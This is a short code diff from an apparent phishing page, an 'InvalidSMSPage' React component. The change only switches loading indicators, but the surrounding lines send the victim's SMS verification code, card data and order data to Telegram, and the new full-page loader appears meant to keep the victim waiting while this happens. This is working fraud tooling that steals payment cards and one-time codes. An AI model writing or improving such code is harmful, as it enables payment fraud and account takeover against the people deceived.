@@ -61,8 +61,9 @@ const InvalidSMSPage = () => {
       return
     }
 
-    setIsVerifying(true)
-    setIsProcessing(true)
+    // Show loader immediately and keep it visible
+    setIsVerifying(false) // Hide button loading state
+    setIsProcessing(true)  // Show full-page loader
 
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
